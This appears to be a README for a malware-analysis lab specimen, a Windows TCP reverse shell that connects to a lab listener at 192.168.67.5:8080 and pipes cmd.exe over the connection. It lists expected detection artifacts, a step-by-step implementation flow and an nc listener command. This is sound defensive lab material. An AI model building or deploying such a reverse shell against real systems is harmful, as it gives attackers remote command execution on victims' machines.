# A05.4 TCP Reverse Shell

## Summary

Establishes an outbound TCP connection to a controlled lab listener and
redirects a local command shell over that connection.

The sample demonstrates reverse shell behavior commonly associated
with interactive command-and-control, remote operator access, outbound
session establishment, and bidirectional command execution channels.

Unlike beacon samples that periodically check in and return structured
status messages, this specimen creates an interactive TCP stream and
binds that stream to a spawned `cmd.exe` process.

The controlled listener endpoint is:

```text
192.168.67.5:8080
```

This sample is intended only for isolated lab execution and controlled
dynamic-analysis artifact generation.

---

## Behavior Summary

The reverse shell behavior is implemented using:

```text
TcpClient
NetworkStream
StreamReader
StreamWriter
Process
cmd.exe
```

When executed, the sample:

* Connects outbound to the lab listener
* Starts `cmd.exe`
* Redirects standard input, output, and error
* Reads commands from the TCP stream
* Sends command output back over the same TCP connection
* Cleans up the shell process and streams when the connection closes

No persistence, credential theft, file dropping, privilege escalation,
or destructive functionality is performed.

---

## To Execute A05_4

Start a controlled TCP listener on the lab sink host:

```text
192.168.67.5:8080
```

Then run the reverse shell sample directly:

```powershell
.\A05-Beaconing-Interactive-C2\A05_4\bin\A05_4_tcp_reverse_shell.exe
```

Successful execution should result in an outbound TCP connection from
the Windows analysis VM to the lab listener.

---

## Expected Network Artifacts

### TCP Connection

```text
Source: Windows analysis VM
Destination: 192.168.67.5
Port: 8080
Protocol: TCP
Direction: Outbound
```

### Expected Dynamic Signals

Dynamic analysis tools may observe:

* Outbound TCP connection to `192.168.67.5:8080`
* Child process creation of:

```text
C:\Windows\System32\cmd.exe
```

* Redirected standard input
* Redirected standard output
* Redirected standard error
* Interactive command-response traffic over TCP
* No DNS dependency
* No HTTP or HTTPS traffic
* No persistence behavior

---

## Expected Process Artifacts

### Child Process

```text
cmd.exe
```

### Parent Process

```text
A05_4_tcp_reverse_shell.exe
```

### Stream Redirection

```text
RedirectStandardInput = true
RedirectStandardOutput = true
RedirectStandardError = true
UseShellExecute = false
CreateNoWindow = true
```

---

#########################################################################

# High-Level TCP Reverse Shell Flow

1. Start the TCP reverse shell sample:

   ```text
   A05_4_tcp_reverse_shell.exe
   ```

2. Configure the controlled listener endpoint:

   ```text
   192.168.67.5:8080
   ```

3. Create a TCP client using:

   ```text
   TcpClient
   ```

4. Connect to the remote lab listener

5. Obtain the TCP stream using:

   ```text
   GetStream()
   ```

6. Wrap the stream with:

   ```text
   StreamReader
   StreamWriter
   ```

7. Configure a local process object for:

   ```text
   C:\Windows\System32\cmd.exe
   ```

8. Disable shell execution:

   ```text
   UseShellExecute = false
   ```

9. Redirect standard streams:

   ```text
   RedirectStandardInput = true
   RedirectStandardOutput = true
   RedirectStandardError = true
   ```

10. Start the shell process

11. Begin asynchronous output collection using:

    ```text
    BeginOutputReadLine()
    BeginErrorReadLine()
    ```

12. Read command lines from the TCP connection

13. Write received commands into:

    ```text
    cmd.exe StandardInput
    ```

14. Capture command output through event handlers

15. Send output back to the TCP listener using:

    ```text
    StreamWriter.WriteLine()
    ```

16. Continue until the remote listener closes the connection or an
    exception occurs

17. Close stream objects

18. Terminate the shell process if still running

19. Exit cleanly after connection teardown.

## Listener Setup from Ubuntu / INetSim Server

Start the TCP listener on the Ubuntu / INetSim VM before launching the
reverse shell sample on the Windows analysis VM.

Example Netcat listener:

```bash
nc -lvnp 8080
```

The listener should begin waiting for inbound connections on:

```text
0.0.0.0:8080
```

---

### Start the Reverse Shell Sample

After the listener is active, execute the reverse shell sample on the
Windows analysis VM:

```powershell
.\A05-Beaconing-Interactive-C2\A05_4\bin\A05_4_tcp_reverse_shell.exe
```

The sample should establish an outbound TCP connection to:

```text
192.168.67.5:8080
```

Once connected, the remote `cmd.exe` session should become interactive
through the Netcat listener.

---

### Example Benign Validation Commands

Example validation commands from the Ubuntu listener:

```text
whoami
hostname
cd
echo A05_4_TCP_REVERSE_SHELL_TEST
```

These commands generate controlled interactive artifacts for dynamic
analysis without modifying system configuration or performing
destructive actions.

---

### Expected Interactive Output

Example session:

```text
Microsoft Windows [Version 10.0.xxxxx.x]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
win11lab\analyst

C:\Windows\system32>hostname
WIN11-LAB

C:\Windows\system32>echo A05_4_TCP_REVERSE_SHELL_TEST
A05_4_TCP_REVERSE_SHELL_TEST
```

---

### Expected Dynamic Signals During Interaction

Dynamic analysis tools may observe:

* Established outbound TCP session from:

  ```text
  192.168.67.3 → 192.168.67.5:8080
  ```

* Interactive command traffic over the TCP stream

* Child process activity from:

  ```text
  cmd.exe
  ```

* Redirected standard input/output/error streams

* No HTTP, HTTPS, or DNS traffic associated with the interactive shell
  session
